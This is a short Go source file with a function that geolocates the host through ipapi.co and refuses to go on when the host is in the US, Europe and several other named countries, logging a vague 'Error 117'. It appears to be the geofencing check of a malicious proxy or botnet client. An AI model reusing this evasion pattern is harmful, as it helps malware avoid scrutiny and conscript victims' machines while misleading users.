package w64

import (
	"io/ioutil"
	"log"
	"net/http"
	"strings"
)

func canIHaveAProxy() bool {
	ipapiClient := http.Client{}

	req, err := http.NewRequest("GET", "https://ipapi.co/json/", nil)
	if err != nil {
		return false
	}

	req.Header.Set("User-Agent", "ipapi.co/#go-v1.3")

	resp, err := ipapiClient.Do(req)
	if err != nil {
		return false
	}

	defer resp.Body.Close()

	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return false
	}

	respString := string(body)
	NoCandyArr := []string{"Euro", "United States", "United Kingdom", "Canada", "Australia", "New Zealand", "Ireland", "Isreal"}
	
	for _, nocandyString := range NoCandyArr {
		if strings.Contains(respString, nocandyString) {
			log.Println("Error 117")
			return false
		}
	}

	return true
}
